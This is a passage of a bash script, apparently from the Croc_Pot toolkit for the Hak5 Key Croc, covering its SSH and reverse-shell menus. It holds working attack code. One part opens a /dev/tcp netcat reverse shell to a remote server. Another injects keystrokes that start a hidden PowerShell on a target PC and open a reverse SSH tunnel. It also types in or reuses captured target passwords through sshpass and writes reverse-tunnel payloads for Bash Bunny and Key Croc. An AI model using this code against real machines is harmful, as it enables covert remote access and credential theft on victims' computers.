1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$ ]]; then
	ssh root@${r_a}
else
	echo -ne "\e[5m$(ColorRed 'USING DEFAULT IP')${1}"
	ssh root@${1}
fi
}
##
#----SSH check devices for connection
##
check_device() {
if ping -q -c 1 -w 1 ${1} &>/dev/null 2>&1; then
	echo -ne "${yellow}${2} ${3} ${clear}${green}ONLINE IP:${1} ${clear}${4} ${5}"
else
	echo -ne "${yellow}${2} ${3} ${clear}${red}NOT CONNECTED OR CAN'T BE REACHED ${clear}"
fi 2> /dev/null
}
##
#----SSH shark jack get ip from Croc_Pot_Payload
##
shark_check() {
	local SHARK_IP=/root/udisk/tools/Croc_Pot/shark_ip.txt
if [ -e ${SHARK_IP} ]; then
	if [ "$(sed -n '1p' ${SHARK_IP})" != "" ]; then
		IP_F=$(sed -n '1p' ${SHARK_IP})
else
		IP_F=172.16.24.1
	fi
fi 2> /dev/null
}
##
#----SSH owl get ip from mac
##
owl_check() {
	local OWL_IP=$(arp -a | sed -ne '/00:00:00:00:00:00/p' | sed -e 's/.*(\(.*\)).*/\1/')  #place Owl mac here
if [[ "${OWL_IP}" =~ ^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$ ]]; then
	IP_O=${OWL_IP}
else
	IP_O=172.16.56.1
fi
}
##
#----SSH get public ip
##
public_ip() {
	echo -ne "${yellow}Public ip:${clear}${green}$(curl -s --connect-timeout 2 --max-time 2 https://checkip.amazonaws.com) ${clear}"
}
##
#----SSH check port 22 open or closed
##
port_check() {
nc -z -v -w 1 ${1} 22 &>/dev/null 2>&1
if [[ "$?" -ne 0 ]]; then
	echo -ne "${yellow} Port:${clear}${red}22 closed${clear}\n"
elif [[ "${#args[@]}" -eq 0 ]]; then
	echo -ne "${yellow} Port:${clear}${green}22 open${clear}\n"
fi 2> /dev/null
}
##
#----SSH get mac addresses
##
get_mac () {
	echo -ne "${yellow}MAC:${clear}${green}$(arp -n ${1} | awk '/'${1}'/{print $3}' | sed -e 's/HWaddress//g') ${clear}"
}
squirrel_mac() {
if [ -e "/root/udisk/tools/Croc_Pot/squirrel_mac.txt" ]; then
	echo -ne "${yellow}MAC:${clear}${green}$(sed -n 1p /root/udisk/tools/Croc_Pot/squirrel_mac.txt) ${clear}"
fi 2> /dev/null
}
turtle_mac() {
if [ -e "/root/udisk/tools/Croc_Pot/turtle_mac.txt" ]; then
	echo -ne "${yellow}MAC:${clear}${green}$(sed -n 1p /root/udisk/tools/Croc_Pot/turtle_mac.txt) ${clear}"
fi 2> /dev/null
}
bunny_mac() {
if [ "$(OS_CHECK)" = WINDOWS ]; then
	sed -i 's/-/:/g' /root/udisk/tools/Croc_Pot/bunny_mac.txt
	local bunny_v=$(sed -n 1p /root/udisk/tools/Croc_pot/bunny_mac.txt)
elif [ "$(OS_CHECK)" = LINUX ]; then
	local bunny_v=$(sed -n 1p /root/udisk/tools/Croc_pot/bunny_mac.txt)
fi 2> /dev/null
if [[ "$(sed -n 1p /root/udisk/tools/Croc_pot/bunny_mac.txt)" =~ ^([[:xdigit:]][[:xdigit:]]:){5}[[:xdigit:]][[:xdigit:]]$ ]]; then
	echo -ne "${yellow}BASH BUNNY:${clear}${green} ONLINE IP: 172.16.64.1${clear}${yellow} MAC:${clear}${green} ${bunny_v}${clear}\n"
else
	echo -ne "${yellow}BASH BUNNY:${clear}${red} NOT CONNECTED OR CAN'T BE REACHED${clear}\n"
fi 2> /dev/null
}
##
#----SSH check for save VPS server
##
if [ -e "/root/udisk/tools/Croc_Pot/saved_shell.txt" ]; then
	remote_vps=$(sed -n 1p /root/udisk/tools/Croc_Pot/saved_shell.txt)
fi 2> /dev/null
##
#----SSH display info screen
##
	echo -ne "$(Info_Screen '-SSH into HAK5 gear & TARGET PC
-Reverse ssh tunnel, Create SSH Public/Private Key
-Ensure devices are connected to the same local network As keycroc')\n"
check_device $(os_ip) TARGET PC: $(public_ip) ; port_check $(os_ip)
check_device 172.16.42.1 WIFI PINEAPPLE: $(get_mac "172.16.42.1") ; port_check 172.16.42.1
check_device 172.16.32.1 PACKET SQUIRREL: $(squirrel_mac) ; port_check 172.16.32.1
check_device 172.16.84.1 LAN TURTLE: $(turtle_mac) ; port_check 172.16.84.1
shark_check ; check_device ${IP_F} SHARK JACK: $(get_mac) ${IP_F} ; port_check ${IP_F}
bunny_mac
check_device ${remote_vps} REMOTE VPS: ; port_check ${remote_vps}
#owl_check ; check_device ${IP_O} OWL : $(get_mac "${IP_O}") ; port_check ${IP_O}
echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
##
#----SSH keycroc to target pc
##
pc_ssh() {
	clear
	echo -ne "$(ColorYellow 'Found save Passwd try this:') $(target_pw)\n"
if [ -e "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
start_ssh() {
	echo -ne "\t$(ColorYellow 'Target PC user name:') $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
\t$(ColorYellow 'Target PC IP:') $(os_ip)
\t$(ColorGreen 'Starting SSH with Target PC')\n"
if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
	sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
else
	ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
fi
}
case $(OS_CHECK) in
WINDOWS)
	start_ssh ;;
LINUX)
	start_ssh ;;
MACOS)
	echo -ne "\t$(ColorRed 'SORRY NO SUPPORT AT THIS TIME FOR MAC USERS')\n" ;;
*)
	echo -ne "\t$(ColorRed 'SORRY DID NOT FIND VALID OS')\n" ;;
esac
else
	echo -ne "\t$(ColorYellow 'PLEASE RUN CROC_POT_PAYLOAD.TXT TO GET TARGET IP/USERNAME')\n"
fi
}
##
#----SSH enter user/ip to start ssh
##
userinput_ssh() {
	echo -ne "$(ColorBlue 'ENTER THE HOST/USER NAME FOR SSH AND PRESS [ENTER]:')"; read SSH_USER
	echo -ne "$(ColorBlue 'ENTER THE IP FOR SSH AND PRESS [ENTER]:')"; read SSH_IP
	ssh -o "StrictHostKeyChecking no" ${SSH_USER}@${SSH_IP}
}
##
#----SSH to wifi pineapple
##
ssh_pineapple() {
	clear
ssh_shell() {
	read_all ENTER WIFI PINEAPPLE IP FOR SSH AND PRESS [ENTER]
	ip_check_ssh 172.16.42.1
}
##
#----SSH start wifi pineapple web UI
##
pine_web() {
	echo -ne "\n$(ColorYellow 'Starting WIFI Pineapple web page')\n"
if [ "$(OS_CHECK)" = WINDOWS ]; then
	Q GUI d
	Q GUI r
	sleep 1
	Q STRING "powershell"
	Q ENTER
	sleep 2
	Q STRING "Start-Process http://172.16.42.1:1471; exit"
	Q ENTER
else
	case $HOST_CHECK in
raspberrypi)
	Q GUI d
	sleep 1
	Q STRING "LXTerminal"
	Q ENTER
	Q ENTER
	sleep 1
	Q STRING "gio open http://172.16.42.1:1471; exit"
	Q ENTER ;;
parrot)
	Q ALT F2
	sleep 1
	Q STRING "mate-terminal"
	Q ENTER
	sleep 1
	Q STRING "gio open http://172.16.42.1:1471; exit"
	Q ENTER ;;
*)
	Q ALT F2
	sleep 1
	Q STRING "xterm"
	Q ENTER
	sleep 1
	Q STRING "gio open http://172.16.42.1:1471; exit"
	Q ENTER ;;
	esac
fi
}
##
#----SSH wifi pineapple menu
##
MenuTitle WIFI PINEAPPLE MENU
MenuColor 1 SSH PINEAPPLE ; echo -ne "       ${clear}\n"
MenuColor 2 PINEAPPLE WEB ; echo -ne "       ${clear}\n"
MenuColor 3 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
MenuEnd
	case $m_a in
	1) ssh_shell ; ssh_menu ;;
	2) pine_web ; ssh_menu ;;
	3) main_menu ;;
	0) exit 0 ;;
	[bB]) ssh_menu ;;
	*) invalid_entry ; ssh_menu ;;
	esac
}
##
#----SSH to packet squirrel
##
ssh_squirrel() {
	read_all ENTER PACKET SQUIRREL IP FOR SSH AND PRESS [ENTER]
	ip_check_ssh 172.16.32.1
}
##
#----SSH to lan turtle
##
ssh_turtle() {
	read_all ENTER LAN TURTLE IP FOR SSH AND PRESS [ENTER]
	ip_check_ssh 172.16.84.1
}
##
#----SSH to signal owl
##
ssh_owl() {
	read_all ENTER SIGNAL OWL IP FOR SSH AND PRESS [ENTER]
	ip_check_ssh ${IP_O}
}
##
#----SSH to shark jack
##
ssh_shark() {
	read_all ENTER SHARK JACK IP FOR SSH AND PRESS [ENTER]
	ip_check_ssh ${IP_F}
}
##
#----SSH to bash bunny
##
ssh_bunny() {
	clear
	echo -ne "$(Info_Screen '-Start ssh with Target PC to Bash bunny or
-Start REVERSE SHELL Tunnel with keycroc to bash bunny
-Will need a small payload install on bash bunny
-This will create the payload for the bash bunny and save it to tools folder
-Place this in one of the bunny payloads switchs folder this is need for
reverse shell tunnel From bunny to keycroc
-Ensure bash bunny is connected to target pc
-Ensure bash bunny has internet connection
-Recommend to setup public and private keys on both bunny & Croc')\n\n"
	local bunny_payload=/root/udisk/tools/Croc_Pot/Bunny_Payload_Shell
	local bunny_payload_v=/root/udisk/tools/Croc_Pot/Bunny_Payload_Shell/payload.txt
##
#----bunny create reverse shell payload for keycroc
##
if [ -d "${bunny_payload}" ]; then
	LED B
else
	mkdir -p ${bunny_payload}
fi
if [ -e "${bunny_payload_v}" ]; then
	cat ${bunny_payload_v}
	echo -ne "\n${green}Reverse shell payload already exists check tools/Bunny_Payload_Shell folder\n${clear}"
	read_all WOULD YOU LIKE TO KEEP THIS SETUP Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "\n$(ColorGreen 'Keeping existing Bunny_Payload_Shell')\n" ;;
[nN] | [nN][oO])
	rm ${bunny_payload_v}
	echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc\n# Author:        Spywill\n# Version:       1.0
# Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\nsleep 10\nssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nLED ATTACK" | tee ${bunny_payload_v}
	echo -ne "\n${green}Bunny Reverse Tunnel payload is created check tools/Bunny_Payload_Shell folder\n${clear}" ;;
*)
	invalid_entry ; ssh_bunny ;;
esac
else
	echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc\n# Author:        Spywill\n# Version:       1.0
# Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\nsleep 10\nssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nLED ATTACK" | tee ${bunny_payload_v}
	echo -ne "\n${green}Bunny Reverse shell payload is created check tools/Bunny_Payload_Shell folder\n${clear}"
fi
##
#----bunny start ssh session with target pc to bash bunny
##
read_all START SSH WITH TARGET PC TO BUNNY Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
if [ "$(OS_CHECK)" = WINDOWS ]; then
	Q GUI d
	Q GUI r
	sleep 1
	Q STRING "powershell"
	Q ENTER
	sleep 2
	Q STRING "ssh root@172.16.64.1"
	Q ENTER
else
case $HOST_CHECK in
raspberrypi)
	Q GUI d
	sleep 1
	Q STRING "LXTerminal"
	Q ENTER
	Q ENTER
	sleep 1
	Q STRING "ssh root@172.16.64.1"
	Q ENTER ;;
parrot)
	Q ALT F2
	sleep 1
	Q STRING "mate-terminal"
	Q ENTER
	sleep 1
	Q STRING "ssh root@172.16.64.1"
	Q ENTER ;;
*)
	Q ALT F2
	sleep 1
	Q STRING "xterm"
	Q ENTER
	sleep 1
	Q STRING "ssh root@172.16.64.1"
	Q ENTER ;;
esac
fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*) invalid_entry ; ssh_bunny ;;
esac
##
#----bunny start reverse shell bunny to keycroc
##
read_all START REVERSE TUNNEL WITH BUNNY TO CROC Y/N AND PRESS [ENTER]
case $r_a in
	[yY] | [yY][eE][sS])
if [ "$(OS_CHECK)" = WINDOWS ]; then
	LED ATTACK
	ssh -o "StrictHostKeyChecking no" root@localhost -p 7000
elif [ "$(OS_CHECK)" = LINUX ]; then
	LED ATTACK
	ssh -o "StrictHostKeyChecking no" root@localhost -p 7000
fi ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*) 
		invalid_entry ; ssh_bunny ;;
esac
}
##
#----SSH Create public/private keys and copy to remote-host
##
ssh_keygen() {
	clear
	echo -ne "$(Info_Screen '-Create public/private keys using ssh-key-gen on local-host
-Generate keys on the keycroc and send to remote-host
-This will run ssh-keygen and copy to remote-host
-ssh-copy-id -i ~/.ssh/id_rsa.pub username@remote-host-ip
-remote-host can be pineapple,server,pc,etc')\n"
read_all CREATE PUBLIC/PRIVATE KEYS Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	ssh-keygen ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; ssh_keygen ;;
esac
	read_all COPY PUBLIC KEYS TO REMOTE-HOST Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	read_all ENTER USER-NAME@REMOTE-HOST IP AND PRESS [ENTER]
	ssh-copy-id -i ~/.ssh/id_rsa.pub ${r_a} ;;
 [nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; ssh_keygen ;;
esac
}
##
#----SSH reverse shell user input
##
croc_reverse_shell() {
	clear
	echo -ne "$(Info_Screen '# 1 Start reverse shell with nc start listening on remote-server first
# 2 Start listening on the keycroc
# 3 Create payload to start reverse shell KeyCroc to remote-server
# 4 Start reverse ssh tunnel target pc to KeyCroc
# 5 Start reverse ssh tunnel Keycroc to remote-server
# 6 Send remote commands with ssh')\n\n"
shell_input() {
	unset IP_RS IP_RSP IP_RSN
	rm /root/udisk/tools/Croc_Pot/saved_shell.txt 2> /dev/null
	echo -ne "$(ColorBlue 'ENTER IP OF SERVER/REMOTE-HOST PRESS [ENTER]:')"; read IP_RS ; echo "${IP_RS}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
	echo -ne "$(ColorBlue 'ENTER PORT NUMBER TO USE PRESS [ENTER]:')"; read IP_RSP ; echo "${IP_RSP}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
	echo -ne "$(ColorBlue 'ENTER SERVER/REMOTE-HOST NAME PRESS [ENTER]:')"; read IP_RSN ; echo "${IP_RSN}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
}
##
#----SSH reverse with netcat remote listener on (server)
##
remote_listener() {
	clear
	echo -ne "$(Info_Screen '-Start a reverse shell with netcat on keycroc
-Remotely access keycroc from a remote-server
-Frist On the listening remote-server enter this below
-\e[40;32mnc -lnvp PORT# -s IP OF LISTENING REMOTE-SERVER\e[0m\e[40;93m
-On Keycroc Enter ip of the listening remote-server and port number
-Keycroc side will be setup as below
-\e[40;32m/bin/bash -i >& /dev/tcp/remote-server-ip/port#')${clear}\n\n"
read_all START REVERSE SHELL Y/N AND PRESS [ENTER]
case $r_a in
	[yY] | [yY][eE][sS])
		local SAVE_SHELL=/root/udisk/tools/Croc_Pot/saved_shell.txt
if [ -e "${SAVE_SHELL}" ]; then
		echo -ne "\n$(sed -n 1p ${SAVE_SHELL}) Server IP\n$(sed -n 3p ${SAVE_SHELL}) Server user name\n$(sed -n 2p ${SAVE_SHELL}) Server Port\n"
		read_all Found saved shell setup use them Y/N AND PRESS [ENTER]
case $r_a in
	[yY] | [yY][eE][sS])
		echo -ne "\n${yellow}LISTENING SERVER SETUP ${green}nc -lnvp $(sed -n 2p ${SAVE_SHELL}) -s $(sed -n 1p ${SAVE_SHELL})${clear}\n"
		/bin/bash -i >& /dev/tcp/$(sed -n 1p ${SAVE_SHELL})/$(sed -n 2p ${SAVE_SHELL}) 0>&1 & ;;
	[nN] | [nN][oO])
		shell_input
		echo -ne "\n${yellow}LISTENING SERVER SETUP ${green}nc -lnvp ${IP_RSP} -s ${IP_RS}${clear}\n"
		/bin/bash -i >& /dev/tcp/${IP_RS}/${IP_RSP} 0>&1 & ;;
	*)
		invalid_entry ; croc_reverse_shell ;;
esac
else
		echo -ne "$(ColorRed 'Did not find any saved shell setup')\n"
		shell_input
		echo -ne "\n${yellow}LISTENING SERVER SETUP ${green}nc -lnvp ${IP_RSP} -s ${IP_RS}${clear}\n"
		/bin/bash -i >& /dev/tcp/${IP_RS}/${IP_RSP} 0>&1 &
fi ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; croc_reverse_shell ;;
esac
}
##
#----SSH croc as listener
##
croc_listener() {
	clear
	echo -ne "$(Info_Screen '-Start Listening on keycroc
-Access on remote PC,server
-This will start listening on the keycroc
-Enter this below on remote-server/host side
-/bin/bash -i >& /dev/tcp/IP/7000 0>&1 &')\n\n"
read_all START LISTENING ON CROC Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	clear
	echo -ne "\n${yellow}ON REMOTE PC/SERVER SETUP ${green}/bin/bash -i >& /dev/tcp/$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)/7000 0>&1${clear}\n"
	nc -lnvp 7000 -s $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; croc_reverse_shell ;;
esac
}
##
#----SSH reverse ssh tunnel croc (payload)
##
reverse_payload() {
	clear
	echo -ne "$(Info_Screen '-Create Reverse SSH Tunnel Payload keycroc to remote-server
-Plug keycroc into Target pc and type in croctunnel
-Keycroc side will be setup as below
-\e[40;32mssh -fN -R port#:localhost:22 username@your-server-ip\e[0m\e[40;93m
-Enter on remote-server side as below
-\e[40;32mssh root@localhost -p port#')${clear}\n\n"
local PAYLOAD_SHELL=/root/udisk/payloads/Croc_Shell.txt
if [ -e "${PAYLOAD_SHELL}" ]; then
	echo -ne "\n$(ColorGreen 'Croc_Shell already exists')\n"
	cat ${PAYLOAD_SHELL}
	echo ""
	read_all WOULD YOU LIKE TO KEEP THIS SETUP Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "\n$(ColorGreen 'Keeping existing Croc_Shell Payload')\n" ;;
[nN] | [nN][oO])
	rm ${PAYLOAD_SHELL}
	shell_input
	echo -ne "# Title:         Croc_ssh_Tunnel\n# Description:   Create a Reverse SSH Tunnel with keycroc to your server
# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc
#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RSN}@${IP_RS}\nLED ATTACK" >> ${PAYLOAD_SHELL}
	echo -ne "\n$(ColorGreen 'Croc_shell PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')\n"
	cat ${PAYLOAD_SHELL} ;;
*)
	invalid_entry ; croc_reverse_shell ;;
esac
else
	echo -ne "\n$(ColorRed 'Did not find Croc_Shell Payload')\n"
	shell_input
	echo -ne "# Title:         Croc_ssh_Tunnel\n# Description:   Create a Reverse SSH Tunnel with keycroc to your server
# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc
#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RSN}@${IP_RS}\nLED ATTACK" >> ${PAYLOAD_SHELL}
	echo -ne "\n$(ColorGreen 'Croc_shell PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')\n"
fi
}
##
#----SSH reverse ssh tunnle with target pc to keycroc
##
shell_pc() {
	clear
	echo -ne "$(Info_Screen '-Start reverse ssh tunnel Target PC to Keycroc
-PC side will be setup with this below
-\e[40;32mssh -fN -R port#:localhost:22 root@keycroc IP\e[0m\e[40;93m
-Keycroc side will be setup with this below
-\e[40;32mssh PC-username@localhost -p port#\e[0m')\n\n"
	echo -ne "$(ColorYellow 'Found save Passwd try this:') $(target_pw)\n"
start_shell() {
if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
	sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p ${r_a}
else
	ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p ${r_a}
fi
}
if [ -e "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
	read_all START REVERSE SSH TUNNEL TARGET PC TO KEYCROC Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	read_all ENTER PORT NUMBER YOU WOULD LIKE TO USE AND PRESS [ENTER]
	if [ "$(OS_CHECK)" = WINDOWS ]; then
	Q GUI d
	Q GUI r
	sleep 1
	Q STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
	Q ENTER
	sleep 3
	Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
	Q ENTER
	sleep 3
	Q STRING "$(sed -n 1p /tmp/CPW.txt)"
	Q ENTER
	sleep 2
	Q STRING "exit"
	Q ENTER
	Q ALT-TAB
	start_shell
else
case $HOST_CHECK in
raspberrypi)
	Q GUI d
	sleep 1
	Q STRING "LXTerminal"
	Q ENTER
	Q ENTER
	sleep 1
	Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
	Q ENTER
	sleep 2
	Q STRING "$(sed -n 1p /tmp/CPW.txt)"
	Q ENTER
	sleep 1
	Q STRING "exit"
	Q ENTER
	sleep 1
	Q ALT-TAB
	start_shell ;;
parrot)
	Q ALT F2
	sleep 1
	Q STRING "mate-terminal"
	Q ENTER
	sleep 1
	Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
	Q ENTER
	sleep 2
	Q STRING "$(sed -n 1p /tmp/CPW.txt)"
	Q ENTER
	sleep 1
	Q STRING "exit"
	Q ENTER
	sleep 1
	Q ALT-TAB
	start_shell ;;
*)
	Q ALT F2
	sleep 1
	Q STRING "xterm"
	Q ENTER
	sleep 1
	Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
	Q ENTER
	sleep 2
	Q STRING "$(sed -n 1p /tmp/CPW.txt)"
	Q ENTER
	sleep 1
	Q STRING "exit"
	Q ENTER
	sleep 1
	Q ALT-TAB
	start_shell ;;
esac
fi ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; shell_pc ;;
esac
else
	echo -ne "\t$(ColorYellow 'PLEASE RUN CROC_POT_PAYLOAD.TXT TO GET TARGET IP/USERNAME')\n"
fi
}
##
#----SSH start a Reverse SSH Tunnel Keycroc to remote-server
##
ssh_tunnel() {
	clear
	echo -ne "$(Info_Screen '-Start a Reverse SSH Tunnel Keycroc to remote-server
-Remotely access keycroc from a remote-server VPS
-Keycroc will be setup with these setting below
-\e[40;32mssh -fN -R port#:localhost:22 root@remote-server-ip\e[0m\e[40;93m
-ON remote-server side enter this below
-\e[40;32mssh root@localhost -p port#')\n"
start_tunnel() {
	echo -ne "\n${yellow}Keycroc SETUP ${green}ssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL})${clear}\n"
	echo -ne "\n${yellow}SERVER SETUP ${green}ssh root@localhost -p $(sed -n 2p ${SAVE_SHELL})${clear}\n"
	ssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL})
}
read_all START REVERSE SSH TUNNEL Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	SAVE_SHELL=/root/udisk/tools/Croc_Pot/saved_shell.txt
if [ -e "${SAVE_SHELL}" ]; then
	echo -ne "\n$(sed -n 1p ${SAVE_SHELL}) Server IP\n$(sed -n 3p ${SAVE_SHELL}) User name\n$(sed -n 2p ${SAVE_SHELL}) Server Port\n"
	read_all Found saved shell setup use them Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	start_tunnel ;;
[nN] | [nN][oO])
	rm ${SAVE_SHELL}
	shell_input
	start_tunnel ;;
*)
	invalid_entry ; ssh_tunnel ;;
esac
else
	echo -ne "$(ColorRed 'Did not find any saved shell setup')\n"
	shell_input
	start_tunnel
fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; ssh_tunnel ;;
esac
}
##
#----SSH Execute a remote command on a host over SSH
##
remote_command() {
	clear
	echo -ne "$(Info_Screen '-Execute a remote command on a host over SSH
-Example ssh root@192.168.1.1 uptime
-ssh USER@HOST COMMAND1; COMMAND2; COMMAND3 or
-ssh USER@HOST COMMAND1 | COMMAND2 | COMMAND3
-SSH between remote hosts and get back the output')\n\n"
target_command() {
	echo -ne "$(ColorBlue 'ENTER COMMAND AND PRESS [ENTER]'): "; read USER_COMMAND
	ssh ${1}@${@:2} ${USER_COMMAND}
	sleep 5
}
input_command() {
	echo -ne "$(ColorBlue 'ENTER TARGET USRNAME AND PRESS [ENTER]'): "; read USERNAME_COMMAND
	echo -ne "$(ColorBlue 'ENTER TARGET IP AND PRESS [ENTER]'): "; read IP_COMMAND
	echo -ne "$(ColorBlue 'ENTER COMMAND AND PRESS [ENTER]'): "; read USER_COMMAND
	ssh ${USERNAME_COMMAND}@${IP_COMMAND} ${USER_COMMAND}
	sleep 5
}
pc_target_command() {
	echo -ne "$(ColorBlue 'ENTER COMMAND AND PRESS [ENTER]'): "; read USER_COMMAND
if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
	sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip) ${USER_COMMAND}
	sleep 5
else
	ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip) ${USER_COMMAND}
	sleep 5
fi
}
command_menu() {
MenuTitle REMOTE COMMAND MENU
MenuColor 1 COMMAND TO TARGET PC ; echo -ne "    ${clear}\n"
